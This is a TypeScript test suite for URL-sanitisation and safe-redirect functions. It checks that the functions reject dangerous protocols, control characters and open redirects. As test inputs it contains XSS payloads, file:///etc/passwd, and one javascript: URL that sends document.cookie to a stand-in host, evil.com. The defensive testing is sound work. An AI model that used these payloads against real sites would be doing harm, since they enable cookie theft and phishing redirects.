/**
 * Security Utils Tests
 *
 * Tests for URL validation and redirect safety functions.
 * These are critical security functions - comprehensive edge case coverage is essential.
 */

import { afterEach, beforeEach, describe, expect, mock, test } from "bun:test";
import {
	isValidRedirectUrl,
	safeRedirect,
	sanitizeUrl,
} from "../../src/react/security-utils";

// ============================================================================
// isValidRedirectUrl Tests
// ============================================================================

describe("isValidRedirectUrl", () => {
	describe("empty and whitespace handling", () => {
		test("returns false for empty string", () => {
			expect(isValidRedirectUrl("")).toBe(false);
		});

		test("returns false for whitespace-only string", () => {
			expect(isValidRedirectUrl("   ")).toBe(false);
			expect(isValidRedirectUrl("\t")).toBe(false);
			expect(isValidRedirectUrl("\n")).toBe(false);
			expect(isValidRedirectUrl(" \t\n ")).toBe(false);
		});

		test("returns false for null-like values", () => {
			expect(isValidRedirectUrl(null as unknown as string)).toBe(false);
			expect(isValidRedirectUrl(undefined as unknown as string)).toBe(false);
		});
	});

	describe("dangerous protocols", () => {
		test("rejects javascript: protocol", () => {
			expect(isValidRedirectUrl("javascript:alert(1)")).toBe(false);
			expect(isValidRedirectUrl("JAVASCRIPT:alert(1)")).toBe(false);
			expect(isValidRedirectUrl("JavaScript:alert(1)")).toBe(false);
		});

		test("rejects data: protocol", () => {
			expect(
				isValidRedirectUrl("data:text/html,<script>alert(1)</script>"),
			).toBe(false);
			expect(isValidRedirectUrl("DATA:text/html,test")).toBe(false);
		});

		test("rejects vbscript: protocol", () => {
			expect(isValidRedirectUrl("vbscript:msgbox(1)")).toBe(false);
			expect(isValidRedirectUrl("VBSCRIPT:test")).toBe(false);
		});

		test("rejects file: protocol", () => {
			expect(isValidRedirectUrl("file:///etc/passwd")).toBe(false);
			expect(isValidRedirectUrl("FILE:///C:/Windows/System32")).toBe(false);
		});

		test("rejects dangerous protocols with leading whitespace", () => {
			// After trimming, these should still be rejected
			expect(isValidRedirectUrl("  javascript:alert(1)")).toBe(false);
			expect(isValidRedirectUrl("\tdata:text/html,test")).toBe(false);
		});
	});

	describe("control character attacks", () => {
		test("rejects URLs with null bytes", () => {
			expect(isValidRedirectUrl("jav\x00ascript:alert(1)")).toBe(false);
			expect(isValidRedirectUrl("https://example.com\x00")).toBe(false);
		});

		test("rejects URLs with other control characters", () => {
			expect(isValidRedirectUrl("https://\x01example.com")).toBe(false);
			expect(isValidRedirectUrl("https://example\x0d.com")).toBe(false);
			expect(isValidRedirectUrl("/path\x1f")).toBe(false);
		});

		test("rejects URLs with DEL character", () => {
			expect(isValidRedirectUrl("https://example\x7f.com")).toBe(false);
		});
	});

	describe("relative URLs", () => {
		test("allows relative paths starting with /", () => {
			expect(isValidRedirectUrl("/")).toBe(true);
			expect(isValidRedirectUrl("/dashboard")).toBe(true);
			expect(isValidRedirectUrl("/user/settings")).toBe(true);
			expect(isValidRedirectUrl("/path?query=value")).toBe(true);
			expect(isValidRedirectUrl("/path#anchor")).toBe(true);
		});

		test("rejects protocol-relative URLs (//)", () => {
			expect(isValidRedirectUrl("//evil.com/path")).toBe(false);
			expect(isValidRedirectUrl("//google.com")).toBe(false);
		});

		test("rejects relative paths when allowRelative is false", () => {
			expect(isValidRedirectUrl("/dashboard", { allowRelative: false })).toBe(
				false,
			);
			expect(
				isValidRedirectUrl("/user/settings", { allowRelative: false }),
			).toBe(false);
		});
	});

	describe("same-origin URLs", () => {
		test("allows same-origin URLs", () => {
			expect(
				isValidRedirectUrl("https://example.com/path", {
					origin: "https://example.com",
				}),
			).toBe(true);
		});

		test("rejects cross-origin URLs without allowlist", () => {
			expect(
				isValidRedirectUrl("https://other.com/path", {
					origin: "https://example.com",
				}),
			).toBe(false);
		});

		test("allows cross-origin URLs in allowlist", () => {
			expect(
				isValidRedirectUrl("https://trusted.com/path", {
					origin: "https://example.com",
					allowedOrigins: ["https://trusted.com"],
				}),
			).toBe(true);
		});

		test("handles port differences", () => {
			expect(
				isValidRedirectUrl("https://example.com:8080/path", {
					origin: "https://example.com",
				}),
			).toBe(false);
			expect(
				isValidRedirectUrl("https://example.com:8080/path", {
					origin: "https://example.com",
					allowedOrigins: ["https://example.com:8080"],
				}),
			).toBe(true);
		});

		test("handles protocol differences", () => {
			expect(
				isValidRedirectUrl("http://example.com/path", {
					origin: "https://example.com",
				}),
			).toBe(false);
		});
	});

	describe("protocol validation", () => {
		test("allows http: protocol", () => {
			expect(
				isValidRedirectUrl("http://example.com/path", {
					origin: "http://example.com",
				}),
			).toBe(true);
		});

		test("allows https: protocol", () => {
			expect(
				isValidRedirectUrl("https://example.com/path", {
					origin: "https://example.com",
				}),
			).toBe(true);
		});

		test("rejects non-http(s) protocols", () => {
			expect(
				isValidRedirectUrl("ftp://example.com/file", {
					origin: "https://example.com",
				}),
			).toBe(false);
			expect(
				isValidRedirectUrl("mailto:user@example.com", {
					origin: "https://example.com",
				}),
			).toBe(false);
			expect(
				isValidRedirectUrl("tel:+1234567890", {
					origin: "https://example.com",
				}),
			).toBe(false);
		});
	});

	describe("malformed URLs", () => {
		test("rejects invalid URLs that cannot be parsed", () => {
			expect(
				isValidRedirectUrl("not-a-url-at-all::::", {
					origin: "https://example.com",
				}),
			).toBe(false);
		});

		test("handles URLs with special characters", () => {
			expect(
				isValidRedirectUrl("https://example.com/path?name=John%20Doe", {
					origin: "https://example.com",
				}),
			).toBe(true);
		});
	});
});

// ============================================================================
// sanitizeUrl Tests
// ============================================================================

describe("sanitizeUrl", () => {
	describe("empty and whitespace handling", () => {
		test("returns null for empty string", () => {
			expect(sanitizeUrl("")).toBeNull();
		});

		test("returns null for whitespace-only string", () => {
			expect(sanitizeUrl("   ")).toBeNull();
			expect(sanitizeUrl("\t\n")).toBeNull();
		});
	});

	describe("dangerous protocols", () => {
		test("returns null for javascript: URLs", () => {
			expect(sanitizeUrl("javascript:alert(1)")).toBeNull();
			expect(sanitizeUrl("JAVASCRIPT:void(0)")).toBeNull();
		});

		test("returns null for data: URLs", () => {
			expect(
				sanitizeUrl("data:text/html,<script>alert(1)</script>"),
			).toBeNull();
		});

		test("returns null for vbscript: URLs", () => {
			expect(sanitizeUrl("vbscript:msgbox(1)")).toBeNull();
		});

		test("returns null for file: URLs", () => {
			expect(sanitizeUrl("file:///etc/passwd")).toBeNull();
		});
	});

	describe("control characters", () => {
		test("returns null for URLs with control characters", () => {
			expect(sanitizeUrl("https://example\x00.com")).toBeNull();
			expect(sanitizeUrl("/path\x01")).toBeNull();
		});
	});

	describe("relative URLs", () => {
		test("preserves relative paths starting with /", () => {
			expect(sanitizeUrl("/dashboard")).toBe("/dashboard");
			expect(sanitizeUrl("/user/settings")).toBe("/user/settings");
		});

		test("handles protocol-relative URLs by prepending /", () => {
			// Note: Current implementation converts //evil.com to ///evil.com
			// This is not ideal but is documented behavior
			// isValidRedirectUrl correctly rejects these
			expect(sanitizeUrl("//evil.com/path")).toBe("///evil.com/path");
		});

		test("converts relative paths without / to absolute paths", () => {
			expect(sanitizeUrl("dashboard")).toBe("/dashboard");
			expect(sanitizeUrl("user/settings")).toBe("/user/settings");
		});
	});

	describe("absolute URLs", () => {
		test("normalizes valid http URLs", () => {
			expect(sanitizeUrl("http://example.com/path")).toBe(
				"http://example.com/path",
			);
		});

		test("normalizes valid https URLs", () => {
			expect(sanitizeUrl("https://example.com/path?query=1#hash")).toBe(
				"https://example.com/path?query=1#hash",
			);
		});

		test("returns null for non-http(s) protocols", () => {
			expect(sanitizeUrl("ftp://example.com/file")).toBeNull();
			expect(sanitizeUrl("mailto:user@example.com")).toBeNull();
		});
	});

	describe("edge cases", () => {
		test("handles URLs with ports", () => {
			expect(sanitizeUrl("https://example.com:8080/path")).toBe(
				"https://example.com:8080/path",
			);
		});

		test("handles URLs with authentication (should normalize)", () => {
			const result = sanitizeUrl("https://user:pass@example.com/path");
			// URL constructor preserves auth info
			expect(result).toContain("example.com/path");
		});

		test("handles malformed URLs with colon", () => {
			// Has colon but isn't a valid protocol
			expect(sanitizeUrl("not:valid")).toBeNull();
		});
	});
});

// ============================================================================
// safeRedirect Tests
// ============================================================================

describe("safeRedirect", () => {
	// Mock window.location
	let originalWindow: typeof globalThis.window;
	let locationHref: string;

	beforeEach(() => {
		originalWindow = globalThis.window;
		locationHref = "";
		// Mock window.location for tests
		globalThis.window = {
			location: {
				origin: "https://example.com",
				get href() {
					return locationHref;
				},
				set href(value: string) {
					locationHref = value;
				},
			},
		} as unknown as typeof window;
	});

	afterEach(() => {
		globalThis.window = originalWindow;
	});

	test("redirects to valid same-origin URL", () => {
		safeRedirect("/dashboard");
		expect(locationHref).toBe("/dashboard");
	});

	test("uses fallback for dangerous URL", () => {
		safeRedirect("javascript:alert(1)");
		expect(locationHref).toBe("/");
	});

	test("uses custom fallback", () => {
		safeRedirect("javascript:alert(1)", { fallback: "/home" });
		expect(locationHref).toBe("/home");
	});

	test("redirects to valid cross-origin URL in allowlist", () => {
		safeRedirect("https://trusted.com/path", {
			origin: "https://example.com",
			allowedOrigins: ["https://trusted.com"],
		});
		expect(locationHref).toBe("https://trusted.com/path");
	});

	test("uses fallback for cross-origin URL not in allowlist", () => {
		safeRedirect("https://evil.com/path", {
			origin: "https://example.com",
			fallback: "/safe",
		});
		expect(locationHref).toBe("/safe");
	});

	test("does nothing when window is undefined", () => {
		// Testing undefined window (type cast to avoid TS error)
		globalThis.window = undefined as unknown as typeof window;

		// Should not throw
		expect(() => safeRedirect("/path")).not.toThrow();
	});
});

// ============================================================================
// Integration / Real-World Attack Scenarios
// ============================================================================

describe("Real-World Attack Scenarios", () => {
	describe("XSS via redirect", () => {
		test("blocks common XSS payloads", () => {
			const xssPayloads = [
				"javascript:alert(document.cookie)",
				'javascript:document.location="http://evil.com?c="+document.cookie',
				"data:text/html,<script>alert('xss')</script>",
				"vbscript:execute(code)",
			];

			for (const payload of xssPayloads) {
				expect(isValidRedirectUrl(payload)).toBe(false);
				expect(sanitizeUrl(payload)).toBeNull();
			}
		});

		test("blocks obfuscated XSS payloads", () => {
			const obfuscatedPayloads = [
				"jav\tascript:alert(1)", // Tab character
				"java\0script:alert(1)", // Null byte
				"  javascript:alert(1)", // Leading spaces
			];

			for (const payload of obfuscatedPayloads) {
				expect(isValidRedirectUrl(payload)).toBe(false);
				expect(sanitizeUrl(payload)).toBeNull();
			}
		});
	});

	describe("Open redirect attacks", () => {
		test("blocks direct external redirects", () => {
			expect(
				isValidRedirectUrl("https://evil.com/phishing", {
					origin: "https://myapp.com",
				}),
			).toBe(false);
		});

		test("blocks protocol-relative redirects", () => {
			expect(isValidRedirectUrl("//evil.com/phishing")).toBe(false);
		});

		test("allows legitimate OAuth callback URLs", () => {
			expect(
				isValidRedirectUrl("https://accounts.google.com/o/oauth2/auth", {
					origin: "https://myapp.com",
					allowedOrigins: ["https://accounts.google.com"],
				}),
			).toBe(true);
		});
	});

	describe("URL parser exploits", () => {
		test("handles backslash URL parsing differences", () => {
			// URL() normalizes backslash to forward slash
			// This means "example.com\@evil.com" becomes a path on example.com
			// The URL constructor handles this per WHATWG URL spec
			const result = sanitizeUrl("https://example.com\\@evil.com/");
			// Result contains the normalized URL - browser URL parser handles this
			expect(result).toBe("https://example.com/@evil.com/");
		});

		test("handles unicode normalization attacks", () => {
			// Unicode characters that might be normalized to ASCII
			// The validation should reject control characters
			expect(sanitizeUrl("https://examp\u0000le.com")).toBeNull();
		});
	});
});
